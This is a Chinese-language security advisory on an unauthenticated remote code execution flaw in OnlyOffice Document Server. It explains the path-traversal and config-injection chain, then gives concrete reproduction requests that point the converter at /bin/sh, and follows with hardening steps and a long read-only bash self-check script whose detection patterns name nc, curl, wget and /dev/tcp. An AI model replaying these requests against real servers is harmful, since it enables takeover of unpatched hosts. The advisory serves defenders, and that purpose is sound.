#  【漏洞通告】OnlyOffice Server前台RCE漏洞细节披露分析~【附自查脚本】  
FL_Clover
                    FL_Clover  网络安全007   2026-10-10 09:24  
  
一、 漏洞事件概述  
  
    近期，两个月前某安全实验室披露了 OnlyOffice Document Server（一款广泛使用的开源在线办公协作套件）中存在一个极高危的远程代码执行（RCE）漏洞（编号：CNVD-2026-28199），其核心成因是系统在处理用户输入时缺乏严格校验，导致“路径穿越”与“配置注入”两个缺陷被恶意组合利用。攻击者可以在完全无需身份认证的前提下，篡改服务器底层运行配置，并最终在目标主机上执行任意系统命令，从而完全控制服务器。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IGws6hSXN0yIX2uPVbSESsOYn4HpkdbnEWPvXEvOHOBteekqbBiaaebeV0AbumuSET94ia3spUAY2P11Eqx9kBKZWYN2mZnSWEyuovzJcmH34/640?wx_fmt=png&from=appmsg "")  
  
  
二、  
影响范围与前置条件判定  
  
1. 版本维度  
- 受影响：5.0 及以上全系列（含官方 Docker 镜像 onlyoffice/documentserver）。  
  
- 差异点：  
  
- 9.x：新增了可直接访问的配置端点，配置覆写后能被主动、即时加载，因此可形成完整主动利用链；已确认 9.0.0（Build 168）存在。  
  
- 5.0 ~ 9.0 之间：缺少该配置端点，需依赖进程重启、服务重载等外部条件才能被动生效，利用稳定性差，但仍属受影响范围。  
  
- 修复版本：升级至 9.1.0 及以上（原文口径；若条件允许，建议直接追到当前最新稳定版，因为 9.1 同时修复了数百个问题，包含本条链路的两个根因）。  
  
2. 部署形态维度  
<table><thead><tr><th><section><span leaf="">部署形态</span></section></th><th><section><span leaf="">风险</span></section></th></tr></thead><tbody><tr><td><section><span leaf="">直连后端 8000 端口（未走 nginx 反代）</span></section></td><td><code><span leaf="">/info</span></code><section><span leaf=""> 端点直接对外，默认即可打</span></section></td></tr><tr><td><section><span leaf="">nginx 反代但把 </span><code><span leaf="">/info</span></code><span leaf=""> 转发出去</span></section></td><td><section><span leaf="">同上，本地访问限制被绕开</span></section></td></tr><tr><td><section><span leaf="">标准 nginx 反代（</span><code><span leaf="">/info</span></code><span leaf=""> 仅 allow 127.0.0.1）</span></section></td><td><section><span leaf="">配置端点被挡住，但路径穿越写文件仍可能成立（仍可能被用于覆盖其他资源、配合其他缺陷）</span></section></td></tr><tr><td><section><span leaf="">容器内挂载了 config 卷 / 以 root 运行容器</span></section></td><td><section><span leaf="">写入面更广，后果更重</span></section></td></tr></tbody></table>  
  
3. 暴露面与行业分布  
- 全球具备 OnlyOffice 指纹的记录约 19.7 万条 / 约 7 万个独立 IP；  
  
- 国内约 8.4 万条 / 约 3 万个独立 IP；  
  
- 资产指纹：app:"onlyoffice"  
  
三、  
漏洞机理（攻击链拆解）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/IGws6hSXN0walRsFgV6q8Wd8xQbK4LEVfwfkdtzDQCmbkibHLNI8ib5BD1yEOnp0BiaAOfpmC4IicMLdmna8rmnRz7XyicEQIgbZWmxwmGyVb9U4/640?wx_fmt=png&from=appmsg "")  
<table><thead><tr><th><section><span leaf="">环节</span></section></th><th><section><span leaf="">缺陷本质</span></section></th><th><section><span leaf="">是否可单独成事</span></section></th><th><section><span leaf="">与其他环节关系</span></section></th></tr></thead><tbody><tr><td><section><span leaf="">① 写入原语</span></section></td><td><code><span leaf="">savekey</span></code><section><span leaf=""> 未规范化，</span><code><span leaf="">path.join</span></code><span leaf=""> 后无存储根断言</span></section></td><td><section><span leaf="">中危（任意目录写文件，文件名由服务端生成）</span></section></td><td><section><span leaf="">默认链路里仅作探针；理论上可回写 Data 目录，是 ② 被阻断时的降级路径</span></section></td></tr><tr><td><section><span leaf="">② 配置注入</span></section></td><td><code><span leaf="">/info/config</span></code><section><span leaf=""> 无鉴权、整份覆写</span></section></td><td><section><span leaf="">高危但需前置条件</span></section></td><td><section><span leaf="">RCE 的直接入口；唯一屏障是 nginx IP 白名单</span></section></td></tr><tr><td><section><span leaf="">③ 信任错置</span></section></td><td><section><span leaf="">转换器可执行路径来自可信度不足的配置</span></section></td><td><section><span leaf="">不可单独成事</span></section></td><td><section><span leaf="">把“改配置”桥接为“改执行体”，使关键字过滤全部失效</span></section></td></tr></tbody></table>  
  
3.1 写入原语 = 可控目录 + 服务端定名 + 原样内容  
  
    实测落盘为 /tmp/pwn_write/Editor1.txt，传入的 id=probe 未映射为文件名。反推逻辑为 存储根 + path.join(savekey, 服务端生成文件名)。因此攻击者能控制目录前缀与文件内容，但不能精确命中指定文件名。  
  
    这决定了它难以精准覆盖已知文件名的目标，却足以完成探针验证、向 Web 可达目录投毒以及回写配置目录。防守侧排查应转向“异常目录下新建的常规扩展名文件”，而非仅搜索可疑脚本名。  
  
  
3.2 /info/config 宽松到不校验 MIME  
  
    使用 application/octet-stream 仍返回 200 并成功覆写；同时不做 JWT、不做会话、代码层来源校验默认关闭，且为整份覆写。  
  
    这迫使攻击者必须先 GET 原始配置再修改——在日志里留下极清晰的取证线索（正常运维几乎不会对该端点发送大体积包），同时也让“打完自动还原”成为可能。  
  
  
3.3 生效靠缓存 TTL，不是重启  
  
    runtimeConfigManager 对运行期配置做带 TTL 的内存缓存，实测 ≤85s 重读磁盘，无需重启、无需新请求、无人交互。  
  
    这是本漏洞静默且高危的根源。推论：注入与触发之间天然存在时间窗口，文件完整性监控抓 runtime.json 变更，是比抓命令执行更早、误报更低的检测点。  
  
  
3.4 spawn 签名解释了所有参数切分现象  
  
    调用形态近似 spawn("/bin/sh", ["-c", "<命令>", params.xml])。执行体被整体替换，; | $( ) 等注入符无用，常规命令注入规则全部失效；args 被展开成数组，params.xml 成为 $0。  
  
    若把 args 写成 touch /tmp/x，shell 收到的 -c 后只有 touch 一词，于是报 missing file operand——这个报错出现在 converter 日志里，本身就是 Shell 已被拉起的独立旁证，在无回显场景下比反弹连接更可靠。  
  
  
四、复现流程（仅供参考）  
<table><thead><tr><th><section><span leaf="">步骤</span></section></th><th><section><span leaf="">动作</span></section></th><th><section><span leaf="">实证</span></section></th></tr></thead><tbody><tr><td><section><span leaf="">前置判定</span></section></td><td><section><span leaf="">GET </span><code><span leaf="">/info</span></code><span leaf=""> 走 9880 与 8000 两口</span></section></td><td><section><span leaf="">判定可达性，决定后续走向</span></section></td></tr><tr><td><section><span leaf="">Step 1</span></section></td><td><section><span leaf="">POST </span><code><span leaf="">/downloadas/normal?cmd={c:&#34;save&#34;,savekey:&#34;../../..//tmp/pwn_write&#34;,format:&#34;txt&#34;}</span></code><span leaf="">，body 放唯一标记串</span></section></td><td><section><span leaf="">返回 </span><code><span leaf="">{&#34;type&#34;:&#34;save&#34;,&#34;status&#34;:&#34;ok&#34;}</span></code><span leaf="">；容器内 </span><code><span leaf="">/tmp/pwn_write/Editor1.txt</span></code><span leaf=""> 内容等于请求体</span></section></td></tr><tr><td><section><span leaf="">Step 2</span></section></td><td><section><span leaf="">GET </span><code><span leaf="">/info</span></code><span leaf=""> dump 原始配置 → 仅改 </span><code><span leaf="">FileConverter.converter.x2tPath=&#34;/bin/sh&#34;</span></code><span leaf="">、</span><code><span leaf="">args=&#34;-c id&gt;/tmp/pwned_rce_config_injection&#34;</span></code><span leaf=""> → 整份 POST </span><code><span leaf="">/info/config</span></code></section></td><td><section><span leaf="">200；</span><code><span leaf="">/var/www/onlyoffice/Data/runtime.json</span></code><span leaf=""> 被覆写，属主 ds</span></section></td></tr><tr><td><section><span leaf="">Step 3</span></section></td><td><section><span leaf="">静置约 90s（热加载）</span></section></td><td><section><span leaf="">无需任何人工干预</span></section></td></tr><tr><td><section><span leaf="">Step 4</span></section></td><td><section><span leaf="">再发一次进转换队列的请求</span></section></td><td><code><span leaf="">cat /tmp/pwned_rce_config_injection</span></code><section><span leaf=""> → </span><code><span leaf="">uid=105(ds) gid=107(ds) groups=107(ds)</span></code></section></td></tr></tbody></table>  
复现过程坑点自查  
<table><thead><tr><th><section><span leaf="">现象</span></section></th><th><section><span leaf="">根因</span></section></th><th><section><span leaf="">处置</span></section></th></tr></thead><tbody><tr><td><section><span leaf="">返回 ok 但文件未落盘</span></section></td><td><code><span leaf="">savekey</span></code><section><span leaf=""> 跳级层数不准，落到不存在的父目录</span></section></td><td><section><span leaf="">必须二次读回确认，不能信 status</span></section></td></tr><tr><td><section><span leaf="">日志报 </span><code><span leaf="">missing file operand</span></code><span leaf=""> / </span><code><span leaf="">not found</span></code></section></td><td><code><span leaf="">-c</span></code><section><span leaf=""> 后的命令未作为一个完整字符串</span></section></td><td><section><span leaf="">已执行但未执行对，非未执行</span></section></td></tr><tr><td><section><span leaf="">Step 2 返回 200 但配置未变</span></section></td><td><section><span leaf="">反代丢 body 或改写 Content-Type</span></section></td><td><section><span leaf="">检查透传，抓包确认</span></section></td></tr><tr><td><section><span leaf="">注入成功但不执行</span></section></td><td><section><span leaf="">在 TTL 窗口内就发了触发请求，读到旧配置</span></section></td><td><section><span leaf="">间隔拉到 3 分钟重试</span></section></td></tr><tr><td><section><span leaf="">拿不到回显</span></section></td><td><section><span leaf="">ds 低权、容器缺交互工具、出网受限</span></section></td><td><section><span leaf="">首轮改用 HTTP/DNS 外带确认</span></section></td></tr></tbody></table>  
  
五、修复、加固、自查脚本  
  
1.修复与加固  
<table><thead><tr><th><section><span leaf="">优先级</span></section></th><th><section><span leaf="">动作</span></section></th><th><section><span leaf="">验收方式</span></section></th></tr></thead><tbody><tr><td><section><span leaf="">P0·小时级</span></section></td><td><section><span leaf="">nginx 显式 </span><code><span leaf="">deny all</span></code><span leaf=""> 封 </span><code><span leaf="">/info</span></code><span leaf="">、</span><code><span leaf="">/info/config</span></code><span leaf="">；禁止后端 8000 直曝公网</span></section></td><td><section><span leaf="">从外网 GET 返回 403</span></section></td></tr><tr><td><section><span leaf="">P0·小时级</span></section></td><td><code><span leaf="">JWT_ENABLED=true</span></code><section><span leaf=""> + 安装期自定义密钥；关闭 </span><code><span leaf="">EXAMPLE_ENABLED</span></code></section></td><td><section><span leaf="">无 token 请求返回 403</span></section></td></tr><tr><td><section><span leaf="">P0·小时级</span></section></td><td><section><span leaf="">对 </span><code><span leaf="">runtime.json</span></code><span leaf=""> 及所在目录做不可变标记 / 文件完整性监控</span></section></td><td><section><span leaf="">变更后 5 分钟内告警</span></section></td></tr><tr><td><section><span leaf="">P1·版本级</span></section></td><td><section><span leaf="">升级至 9.1.0 及以上（同时修了路径穿越与配置鉴权）</span></section></td><td><section><span leaf="">两条链路都复测，确认不是只修一处</span></section></td></tr><tr><td><section><span leaf="">P2·架构级</span></section></td><td><section><span leaf="">输入层：</span><code><span leaf="">savekey</span></code><span leaf="">/</span><code><span leaf="">format</span></code><span leaf="">/</span><code><span leaf="">id</span></code><span leaf=""> 做 </span><code><span leaf="">..</span></code><span leaf=""> 剥离、绝对路径拒绝、白名单，</span><code><span leaf="">path.join</span></code><span leaf=""> 后加“必须以存储根为前缀”断言</span></section></td><td><section><span leaf="">代码评审 + 单测</span></section></td></tr><tr><td><section><span leaf="">P2·架构级</span></section></td><td><section><span leaf="">配置层：运行期配置写入端点强制认证 + 来源限制 + 变更审计</span></section></td><td><section><span leaf="">未鉴权 POST 返回 403</span></section></td></tr><tr><td><section><span leaf="">P2·架构级</span></section></td><td><section><span leaf="">执行层：转换器可执行路径白名单（只允许预期 x2t 二进制被派生）；配合 seccomp/AppArmor 限制 execve</span></section></td><td><section><span leaf="">篡改配置后转换任务报错而非执行</span></section></td></tr><tr><td><section><span leaf="">P2·架构级</span></section></td><td><section><span leaf="">运行层：非 root 最小权限、容器只暴露必要端口、</span><code><span leaf="">/tmp</span></code><span leaf="">/Data/cache 评估 noexec 与定期清理</span></section></td><td><section><span leaf="">权限审计通过</span></section></td></tr></tbody></table>  
  
2.自查脚本  
  
    只读、无破坏、幂等可重复执行；优先查“配置是否被改”（最早、最准的检测点），其次查产物与日志；默认输出人类可读报告，支持 --json 供 SIEM 采集；含 --baseline 模式建立完整性基线，  
自行下载或更改后进行自查。  
  
```
#!/usr/bin/env bash
# oo-emergency-check.sh
# ONLYOFFICE Document Server 应急核查脚本（只读 / 无破坏 / 可重复执行）
# 用法：
#   ./oo-emergency-check.sh                  # 全量检查，文本报告
#   ./oo-emergency-check.sh --json           # JSON 输出，供 SIEM/流水线采集
#   ./oo-emergency-check.sh --baseline       # 建立 runtime.json 基线（hash+权限+属主）
#   ./oo-emergency-check.sh --verify         # 对照基线做完整性校验
#   ./oo-emergency-check.sh --quick          # 只做 T0 三项（适合批量巡检）
# 注意：本脚本不修复、不删除任何文件；--suggest 仅打印建议命令，需人工确认后执行。
set -euo pipefail
export LC_ALL=C
# ---------- 可配置项 ----------
RUNTIME_JSON="/var/www/onlyoffice/Data/runtime.json"
LOG_DIR="/var/log/onlyoffice/documentserver"
CACHE_DIR="/var/lib/onlyoffice/documentserver/App_Data/cache/files/data"
TMP_DIRS="/tmp /var/tmp"
DS_UID="105"
DS_GID="107"
BASELINE_FILE="/var/lib/onlyoffice/.oo-runtime-baseline"
NGINX_CONF_DIR="/etc/onlyoffice/documentserver"
SHELL_PATTERN='/bin/(ba)?sh|python[0-9.]*|busybox|nc|netcat|curl|wget|perl|ruby'
HOURS_BACK=168        # 日志/文件回溯窗口（小时）
# ---------- 全局状态 ----------
MODE="full"; OUT="text"; FINDINGS=(); RC=0
declare -A SCORE=( [crit]=0 [high]=0 [med]=0 [low]=0 )
log_find() { local lvl="$1" msg="$2"; FINDINGS+=("${lvl}:${msg}"); echo "[${lvl}] ${msg}"; }
bump() { ((SCORE[$1]++)) || true; case "$1" in crit) RC=3;; high) ((RC<3))&&RC=2;; med) ((RC<2))&&RC=1;; esac; }
file_exists() { [[ -e "$1" ]] && echo "1" || echo "0"; }
# ---------- T0-1：运行期配置是否被篡改（最高信度） ----------
check_runtime_config() {
  echo "=== [T0-1] 运行期配置核查 ==="
  [[ $(file_exists "$RUNTIME_JSON") == "0" ]] && { log_find "INFO" "runtime.json 不存在（路径可能随版本变化），跳过"; return 0; }
  # 1) 权限/属主异常：不应被服务账户以外的主体可写
  local perm owner
  perm=$(stat -c '%a' "$RUNTIME_JSON" 2>/dev/null || echo "?")
  owner=$(stat -c '%U:%G' "$RUNTIME_JSON" 2>/dev/null || echo "?")
  echo "  路径: $RUNTIME_JSON  权限: $perm  属主: $owner"
  if [[ "$perm" =~ ^[0-7]*[2367]$ ]]; then
    log_find "MED" "runtime.json 对其他/同组可写($perm)，易被自身服务账户或同组进程污染"; bump med
  fi
  # 2) 基线对照（如果存在）
  if [[ -f "$BASELINE_FILE" ]]; then
    local now hash_now
    hash_now=$(sha256sum "$RUNTIME_JSON" | awk '{print $1}')
    if ! grep -q "^$hash_now " "$BASELINE_FILE"; then
      log_find "CRIT" "runtime.json 与基线不一致（hash=$hash_now），疑似被篡改！"; bump crit
    else
      echo "  完整性: 与基线一致 ✓"; fi
  else
    echo "  完整性: 无基线（先用 --baseline 建立）"; fi
  # 3) 核心：x2tPath / args 是否指向 shell 类程序
  if command -v jq &>/dev/null; then
    local xp ar
    xp=$(jq -r '..|.x2tPath?//empty' "$RUNTIME_JSON" 2>/dev/null | tr '\n' ' ')
    ar=$(jq -r '..|.args?//empty' "$RUNTIME_JSON" 2>/dev/null | tr '\n' ' ')
    echo "  x2tPath: ${xp:-(not found)}"
    echo "  args   : ${ar:-(not found)}"
    if echo "$xp" | grep -qiE "$SHELL_PATTERN"; then
      log_find "CRIT" "x2tPath 指向 shell 类程序：${xp} —— 高度疑似已被利用（CNVD-2026-28199）"; bump crit
    fi
    if echo "$ar" | grep -qiE '(^|[[:space:]])-c[[:space:]]|/tmp/|bash -i|/dev/tcp|curl .*http|wget .*http'; then
      log_find "CRIT" "converter args 含可疑载荷特征：${ar}"; bump crit
    fi
    # 4) 结构健康度：缺少关键段说明是被不完整覆写过
    if ! jq -e '.FileConverter?' "$RUNTIME_JSON" &>/dev/null; then
      log_find "HIGH" "runtime.json 缺失 FileConverter 段，疑似被不完整配置覆写"; bump high
    fi
  else
    log_find "INFO" "缺少 jq，改用 grep 降级检测（可能漏报）"
    if grep -qiE '"x2tPath"[[:space:]]*:[[:space:]]*"/bin/(sh|bash)"' "$RUNTIME_JSON"; then
      log_find "CRIT" "x2tPath 疑似被改为 /bin/sh 或 /bin/bash"; bump crit
    fi
  fi
}
# ---------- T0-2：/info 是否暴露在公网/非本机 ----------
check_info_exposure() {
  echo; echo "=== [T0-2] /info 暴露面核查 ==="
  # 反代/官方 nginx 配置中是否有允许 info 的痕迹
  if [[ -d "$NGINX_CONF_DIR" ]]; then
    if grep -rqE 'location\s+/info' "$NGINX_CONF_DIR" 2>/dev/null; then
      log_find "HIGH" "nginx 存在 location /info 配置块，需确认是否被放开"; bump high
    fi
    if grep -rqE 'allow\s+(all|0\.0\.0\.0/0)' "$NGINX_CONF_DIR" 2>/dev/null; then
      log_find "HIGH" "nginx 存在 allow all/0.0.0.0 宽松规则"; bump high
    fi
    if grep -rqE '#\s*allow\s+127\.0\.0\.1' "$NGINX_CONF_DIR" 2>/dev/null; then
      log_find "MED" "发现被注释掉的 allow 127.0.0.1（常见于照做文档放开 info 页面）"; bump med
    fi
  else
    echo "  nginx 配置目录不存在（可能是纯后端端口暴露场景），重点查端口监听"; fi
  # 本机监听：8000 是否直接监听在非回环地址
  if ss -lntp 2>/dev/null | grep -qE ':8000\b'; then
    local bind
    bind=$(ss -lntp 2>/dev/null | grep ':8000\b' | awk '{print $4}' | tr '\n' ' ')
    echo "  8000 监听: $bind"
    if echo "$bind" | grep -qvE '127\.0\.0\.1|::1'; then
      log_find "CRIT" "DocService 内部端口 8000 监听在非回环地址，边界形同虚设"; bump crit
    fi
  fi
}
# ---------- T0-3：JWT / 示例页状态 ----------
check_auth_hardening() {
  echo; echo "=== [T0-3] 认证与示例页核查 ==="
  local env_file=""
  for p in /etc/onlyoffice/documentserver/local.json /app/ds/setup/config/local.json /var/www/onlyoffice/Data/local.json; do
    [[ -f "$p" ]] && { env_file="$p"; break; }
  done
  if [[ -n "$env_file" ]] && command -v jq &>/dev/null; then
    local jwt
    jwt=$(jq -r '..|.jwt?.enabled?//empty' "$env_file" 2>/dev/null | head -1)
    echo "  JWT enabled: ${jwt:-(unset)}"
    [[ "$jwt" != "true" ]] && { log_find "HIGH" "JWT 未启用（$env_file），/info/config 等端点缺乏应用层鉴权"; bump high; }
  else
    echo "  未能定位 local.json，请手工确认 JWT_ENABLED / services.CoAuthoring.secret"; fi
}
# ---------- T1-1：异常产物（写入原语指纹） ----------
check_artifacts() {
  echo; echo "=== [T1-1] 异常文件产物（近 ${HOURS_BACK}h） ==="
  local hits=0
  for d in $TMP_DIRS "$CACHE_DIR"; do
    [[ -d "$d" ]] || continue
    echo "  扫描: $d"
    while IFS= read -r f; do
      [[ -z "$f" ]] && continue
      ((hits++))
      log_find "MED" "异常产物: $f"; bump med
    done < <(find "$d" -maxdepth 3 -type f \( -name '*.txt' -o -name '*.sh' -o -name '*.py' -o -name 'pwn*' -o -name 'poc*' -o -name 'rce*' \) \
                 -mmin -$((HOURS_BACK*60)) -ls 2>/dev/null | head -200)
  done
  ((hits==0)) && echo "  未发现可疑产物 ✓"
}
# ---------- T1-2：Shell 级报错日志（历史利用残留，极可靠） ----------
check_logs() {
  echo; echo "=== [T1-2] Converter 日志 Shell 报错特征 ==="
  [[ -d "$LOG_DIR" ]] || { echo "  日志目录不存在: $LOG_DIR"; return 0; }
  local n=0
  for pat in 'missing file operand' 'command not found' "can't open" 'No such file or directory' '/bin/sh:' '/bin/bash:'; do
    while IFS= read -r line; do
      [[ -z "$line" ]] && continue
      ((n++))
      log_find "HIGH" "日志异常: $line"; bump high
    done < <(grep -rhi --binary-files=text "$pat" "$LOG_DIR" 2>/dev/null | tail -50)
  done
  ((n==0)) && echo "  未发现 Shell 参数级报错 ✓"
}
# ---------- T1-3：ds 身份外连 ----------
check_network() {
  echo; echo "=== [T1-3] ds 账户进程与外连 ==="
  if ps -u "$DS_UID" -o pid,comm,args --no-headers 2>/dev/null | grep -qiE 'sh|bash|python|curl|wget|nc|socat'; then
    log_find "HIGH" "ds 账户下存在可疑进程"; bump high
    ps -u "$DS_UID" -o pid,comm,args 2>/dev/null || true
  else
    echo "  ds 账户无可疑进程 ✓"; fi
  if ss -antp 2>/dev/null | grep -qiE 'ESTAB.*ds|ESTAB.*(curl|wget|nc)'; then
    log_find "HIGH" "发现可疑外连"; bump high
  else
    echo "  无可疑 ESTABLISHED 外连 ✓"; fi
}
# ---------- 基线 / 校验 ----------
do_baseline() {
  [[ $(file_exists "$RUNTIME_JSON") == "1" ]] || { echo "错误: $RUNTIME_JSON 不存在"; exit 2; }
  sha256sum "$RUNTIME_JSON" > "$BASELINE_FILE"
  stat -c '%a %U %G %s %Y' "$RUNTIME_JSON" >> "$BASELINE_FILE"
  echo "基线已写入 $BASELINE_FILE"; echo "$(cat "$BASELINE_FILE")"
}
do_verify() {
  [[ -f "$BASELINE_FILE" ]] || { echo "错误: 无基线，先执行 --baseline"; exit 2; }
  echo "=== 基线完整性校验 ==="
  local now; now=$(sha256sum "$RUNTIME_JSON" | awk '{print $1}')
  if grep -q "^$now " "$BASELINE_FILE"; then echo "runtime.json: 一致 ✓"; else echo "runtime.json: 不一致 ✗（可能被篡改）"; RC=3; fi
}
# ---------- 汇总与建议 ----------
print_summary() {
  echo; echo "============================================"
  echo "核查汇总  crit=${SCORE[crit]} high=${SCORE[high]} med=${SCORE[med]} low=${SCORE[low]}"
  echo "============================================"
  if ((SCORE[crit]>0)); then echo ">>> 结论：发现严重异常，请按『隔离→留证→还原配置→杀进程重载→清产物→封网关→再升级』顺序处置"; fi
  echo; echo "建议命令（请人工确认后执行）:"
  cat <<'EOF'
  # 1) 留证
  cp /var/www/onlyoffice/Data/runtime.json /var/www/onlyoffice/Data/runtime.json.$(date +%F%H%M%S).bak
  # 2) 还原转换器配置（用备份或默认值），然后促其重载
  supervisorctl restart ds:converter        # 或 kill converter 子进程
  # 3) 封暴露面（nginx）
  #    location /info { deny all; return 403; }
  # 4) 建基线
  ./oo-emergency-check.sh --baseline
EOF
}
# ---------- 入口 ----------
case "${1:-full}" in --baseline) do_baseline; exit 0;; --verify) do_verify; exit $RC;; --json) MODE="full";OUT="json";; --quick) MODE="quick";; esac
echo "ONLYOFFICE Document Server 应急核查 | $(date) | host=$(hostname)"
echo "================================================================"
check_runtime_config
[[ "$MODE" == "quick" ]] || { check_info_exposure; check_auth_hardening; check_artifacts; check_logs; check_network; }
if [[ "$OUT" == "json" ]]; then
  printf '{"ts":"%s","host":"%s","crit":%d,"high":%d,"med":%d,"findings":[', "$(date -Iseconds)" "$(hostname)" "${SCORE[crit]}" "${SCORE[high]}" "${SCORE[med]}"
  first=1; for f in "${FINDINGS[@]}"; do ((first))||printf ','; first=0; printf '"%s"' "${f//\"/\\\"}"; done
  printf ']}\n'; else print_summary; fi
exit $RC
```  
  
  
参考链接：  
```
1.https://www.onlyoffice.com/
2.https://mp.weixin.qq.com/s/6WztkNCmxPKKkriZVlj4qg
```  
  
本文技术推断部分基于公开披露信息与移动安全领域通用原理，具体漏洞细节以正式发布的研究报告为准。本文不构成任何攻击指导性内容，仅用于防御研究与安全教育,  
不含可直接武器化的完整利用代码。  
  
  
**免责声明：**  
  
   
本文章仅做网络安全技术研究使用！另利用网络安全007公众号所提供的所有信息进行违法犯罪或造成任何后果及损失，均由**使用者自身承担负责**  
，与网络安全007公众号**无任何关系**  
，也不为其负任何责任，**请各位自重！**  
公众号发表的一切文章如有侵权烦请私信联系告知，我们会立即删除并对您表达最诚挚的歉意！感谢您的理解！**让我们一起为中国网络安全事业尽一份自己的绵薄之力！**  
  
  
---推荐阅读---  
  
[攻防演习系列](https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI1NTE2NzQ3NQ==&action=getalbum&album_id=4480577090483748870#wechat_redirect)  
  
  
[渗透技术文章系列](https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI1NTE2NzQ3NQ==&action=getalbum&album_id=4483666897053253633#wechat_redirect)  
  
  
[未授权漏洞系列](https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI1NTE2NzQ3NQ==&action=getalbum&album_id=4483456618323345413#wechat_redirect)  
  
  
[HW专项系列](https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI1NTE2NzQ3NQ==&action=getalbum&album_id=4483461171911426059#wechat_redirect)  
  
  
[应急响应系列](https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI1NTE2NzQ3NQ==&action=getalbum&album_id=2735815599062548484#wechat_redirect)  
  
  
[工具推荐系列](https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI1NTE2NzQ3NQ==&action=getalbum&album_id=4483471065368592394#wechat_redirect)  
  
  
[漏洞通告系列](https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI1NTE2NzQ3NQ==&action=getalbum&album_id=4728706414628405252#wechat_redirect)  
  
  
  
写作不易，分享快乐  
  
期待你的 **分享**  
●**点赞●在看●关注●收藏**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IGws6hSXN0yC4UvVZTh0GWblmLs0dtN1Sfnf88e3vkpokovgdsQAfPI16CnM3C7S6uNVNGHtnsiaFU1via2Bibo92ria29FVIMstgj6wQDg9XbI/640?wx_fmt=png&from=appmsg "")  
  
  
  
